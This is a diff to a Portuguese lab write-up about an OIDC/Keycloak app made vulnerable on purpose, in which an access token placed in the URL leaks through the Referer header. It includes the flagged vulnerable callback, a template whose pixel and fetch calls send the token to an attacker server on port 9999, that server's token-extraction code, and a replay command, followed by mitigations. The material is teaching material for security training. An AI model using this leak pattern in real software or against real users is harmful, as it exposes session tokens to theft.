@@ -19,6 +19,36 @@ sem qualquer interação da vítima.
 
 ---
 
+## Fluxo do Ataque
+
+```mermaid
+sequenceDiagram
+    actor V as Vítima (Browser)
+    participant SP1 as SP1 :5001
+    participant KC as Keycloak :8080
+    participant ATK as Atacante :9999
+
+    V->>SP1: GET /login
+    SP1->>KC: Authorization Request (redirect)
+    V->>KC: Introduz credenciais (alice / alice123)
+    KC-->>V: 302 → /callback?code=X
+
+    V->>SP1: GET /callback?code=X
+    SP1->>KC: POST troca code → tokens
+    KC-->>SP1: access_token = eyJhbGci...
+
+    Note over SP1: VULN_A06 = True<br/>token colocado na URL
+
+    SP1-->>V: 302 → /dashboard?token=eyJhbGci...
+    V->>SP1: GET /dashboard?token=eyJhbGci...
+    SP1-->>V: 200 HTML (inclui img src=localhost:9999/pixel.gif)
+
+    V->>ATK: GET /pixel.gif<br/>Referer: localhost:5001/dashboard?token=eyJhbGci...
+    Note over ATK: 💀 TOKEN CAPTURADO<br/>extraído do header Referer
+```
+
+---
+
 ## Análise do Código
 
 ### 1. Flag de controlo — `sp1/config.py`
@@ -29,71 +59,95 @@ sem qualquer interação da vítima.
 VULN_A06_REFERRER_LEAK = True
 ```
 
-Esta flag é importada globalmente em `sp1/app.py` com `from config import *`
-e consultada em dois pontos distintos: no callback OIDC e no template HTML.
+Esta flag é importada com `from config import *` e consultada em dois pontos:
+no callback OIDC (onde decide se o token vai para a URL) e no template HTML
+(onde decide se o recurso externo é carregado).
 
 ---
 
-### 2. Callback OIDC — `sp1/app.py` (rota `/callback`)
+### 2. Fluxo de decisão no `/callback`
 
-Após o Keycloak devolver o authorization code, o SP1 troca-o pelo token.
-É aqui que a vulnerabilidade é introduzida:
+```mermaid
+flowchart TD
+    A([GET /callback?code=X]) --> B[Troca code por token\nno Keycloak]
+    B --> C{VULN_A06_REFERRER_LEAK?}
+
+    C -- True --> D["access_token = token.get('access_token')"]
+    D --> E["redirect('/dashboard?token=eyJ...')"]
+    E --> F["Browser carrega pixel.gif\ncom Referer: URL + token"]
+    F --> G([💀 Token capturado pelo atacante])
+
+    C -- False --> H["redirect('/index')"]
+    H --> I["Token fica apenas em session\nReferer não contém token"]
+    I --> J([✅ Token nunca exposto na URL])
+
+    style G fill:#c0392b,color:#fff
+    style J fill:#27ae60,color:#fff
+```
+
+---
+
+### 3. Código do `/callback` — `sp1/app.py`
 
 ```python
 @app.route("/callback")
 def callback():
-    token = oauth.keycloak.authorize_access_token()   # troca code → tokens
+    token     = oauth.keycloak.authorize_access_token()   # troca code → tokens
     user_info = token.get("userinfo")
-
-    # ... (A-09 session fixation — ver a09_session_fixation.md)
 
     session["user"]         = user_info
     session["access_token"] = token.get("access_token")
 
     # ---- A-06: Token in URL ----
     if VULN_A06_REFERRER_LEAK:
-        # VULNERÁVEL: o access_token é exposto na URL como query parameter
-        # Qualquer recurso externo nesta página vai receber o token via Referer
+        # VULNERÁVEL: access_token exposto como query parameter
+        # Qualquer recurso externo na página receberá o token via Referer
         access_token = token.get("access_token")
         return redirect(url_for("dashboard", token=access_token))
-        #                                    ^^^^^^^^^^^^^^^^^^^^^^^^
-        #                       gera: /dashboard?token=eyJhbGci...
+        #               gera: /dashboard?token=eyJhbGci...
 
     # MITIGADO: redireciona para / sem token na URL
-    # O token fica apenas na sessão server-side (inacessível ao browser)
+    # O token permanece apenas em session["access_token"] — no servidor
     return redirect(url_for("index"))
 ```
 
-**Com `True`:** a resposta HTTP tem `Location: /dashboard?token=eyJhbGci...`
-O token viaja na URL e fica visível em logs, histórico do browser e headers.
+---
 
-**Com `False`:** a resposta tem `Location: /` sem qualquer token.
-O access token permanece apenas em `session["access_token"]` — no servidor.
+### 4. Fluxo de decisão no template
+
+```mermaid
+flowchart TD
+    A([GET /dashboard]) --> B{"token_in_url\nnão vazio?"}
+    B -- Não --> C[Renderiza dashboard\nsem recurso externo]
+    B -- Sim --> D{"vuln_a06 == True?"}
+    D -- Não --> C
+    D -- Sim --> E["Renderiza img src=attacker:9999/pixel.gif\nreferrerpolicy=unsafe-url"]
+    E --> F["Browser faz GET /pixel.gif\ncom Referer: URL completa + token"]
+    F --> G([💀 Token chega ao servidor do atacante])
+
+    style G fill:#c0392b,color:#fff
+    style C fill:#27ae60,color:#fff
+```
 
 ---
 
-### 3. Template do dashboard — `sp1/templates/home.html`
-
-A segunda metade da vulnerabilidade está no template. Quando a página
-`/dashboard?token=...` é renderizada, carrega recursos do servidor do atacante:
+### 5. Template `home.html` — a segunda metade da vulnerabilidade
 
 ```html
 {% if vuln_a06 and token_in_url %}
 
   <!--
     VULNERÁVEL: referrerpolicy="unsafe-url" força o browser a incluir
-    a URL completa (com o token) no header Referer, mesmo em pedidos
-    cross-origin (porta 5001 → porta 9999).
+    a URL completa (com o token) no Referer, mesmo em pedidos cross-origin.
 
     Sem este atributo, o browser aplica strict-origin-when-cross-origin
-    por defeito e envia apenas "http://localhost:5001/" — sem o token.
+    por defeito e enviaria apenas "http://localhost:5001/" — sem o token.
   -->
   <img src="{{ attacker_url }}/pixel.gif"
        referrerpolicy="unsafe-url"
        width="1" height="1">
 
   <script>
-    // O fetch também envia o Referer com referrerPolicy: "unsafe-url"
     fetch("{{ attacker_url }}/log?source=sp1", {
       referrerPolicy: "unsafe-url",
       mode: "no-cors"
@@ -103,47 +157,15 @@ A segunda metade da vulnerabilidade está no template. Quando a página
 {% endif %}
 ```
 
-A condição `{% if vuln_a06 and token_in_url %}` garante que o recurso
-externo só é carregado quando **ambas** as condições são verdadeiras:
-- a flag está activa (`vuln_a06=True` passado pela rota `/dashboard`)
-- o token está presente na URL (`token_in_url` não é vazio)
-
 ---
 
-### 4. Rota do dashboard — `sp1/app.py`
-
-```python
-@app.route("/dashboard")
-def dashboard():
-    user = current_user()
-    if not user:
-        return redirect(url_for("login"))
-
-    token_in_url = request.args.get("token", "")
-    #              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-    #              lê o token da query string da URL
-
-    return render_template(
-        "home.html",
-        user=user,
-        token_in_url=token_in_url,   # passado ao template
-        vuln_a06=VULN_A06_REFERRER_LEAK,
-        attacker_url=ATTACKER_BASE_URL,
-    )
-```
-
----
-
-### 5. Servidor do atacante — `attacker/app.py`
-
-O attacker server recebe o pedido do browser da vítima e extrai o token
-do header `Referer`:
+### 6. Servidor do atacante — extracção do token do Referer
 
 ```python
 @app.route("/pixel.gif")
 def pixel():
     referer = request.headers.get("Referer", "")
-    # Referer recebido: "http://localhost:5001/dashboard?token=eyJhbGci..."
+    # Recebe: "http://localhost:5001/dashboard?token=eyJhbGci..."
 
     token = ""
     if "token=" in referer:
@@ -152,35 +174,7 @@ def pixel():
 
     log_event("A-06: Token via Referer", "pixel.gif",
               f"Referer: {referer}\n  TOKEN CAPTURADO: {token[:80]}...",
-              token=token)   # token completo guardado para copiar
-    ...
-```
-
----
-
-## Fluxo Completo do Ataque
-
-```
-VÍTIMA (browser)              SP1 :5001              ATACANTE :9999
-      │                          │                         │
-      │── GET /login ────────────►│                         │
-      │◄── redirect Keycloak ─────│                         │
-      │                          │                         │
-      │  [login no Keycloak]      │                         │
-      │                          │                         │
-      │── GET /callback?code=X ──►│                         │
-      │                          │── POST token exchange ──►Keycloak
-      │                          │◄── access_token=eyJ... ──│
-      │                          │                         │
-      │◄── 302 /dashboard?token=eyJ... (VULN: token na URL)│
-      │                          │                         │
-      │── GET /dashboard?token=eyJ... ──►│                 │
-      │◄── 200 HTML (com <img src=:9999/pixel.gif>) ────────│
-      │                          │                         │
-      │── GET /pixel.gif ──────────────────────────────────►│
-      │   Referer: localhost:5001/dashboard?token=eyJ...    │
-      │                          │          ^^^^^^^^^^^^^^  │
-      │                          │       TOKEN ROUBADO      │
+              token=token)
 ```
 
 ---
@@ -211,8 +205,6 @@ Usa o botão **📋 Copiar Token** e corre:
 python attacks/a06_use_token.py "eyJhbGci..."
 ```
 
-Resultado: dados completos de alice devolvidos pelo Keycloak.
-
 ---
 
 ## Mitigação — Análise do Código
@@ -222,28 +214,26 @@ Resultado: dados completos de alice devolvidos pelo Keycloak.
 VULN_A06_REFERRER_LEAK = False
 ```
 
-**Efeito 1 — callback não coloca o token na URL:**
+**Efeito 1 — o token não vai para a URL:**
 
 ```python
-# sp1/app.py — /callback
 if VULN_A06_REFERRER_LEAK:
-    access_token = token.get("access_token")
     return redirect(url_for("dashboard", token=access_token))
-    # ↑ este bloco NÃO é executado com False
+    # ↑ NÃO executado
 
 return redirect(url_for("index"))
-# ↑ redireciona para / — token fica apenas na sessão
+# ↑ redireciona para / — token fica apenas em session["access_token"]
 ```
 
-**Efeito 2 — template não carrega o recurso externo:**
+**Efeito 2 — o template não carrega o recurso externo:**
 
 ```html
 {% if vuln_a06 and token_in_url %}
-  <!-- ↑ vuln_a06=False → bloco ignorado → pixel.gif nunca é carregado -->
+  <!-- ↑ vuln_a06=False → bloco ignorado → pixel.gif nunca carregado -->
 {% endif %}
 ```
 
-**Efeito 3 — header `Referrer-Policy` adicionado** (a implementar no Passo 7):
+**Efeito 3 — header `Referrer-Policy` adicionado:**
 
 ```python
 @app.after_request
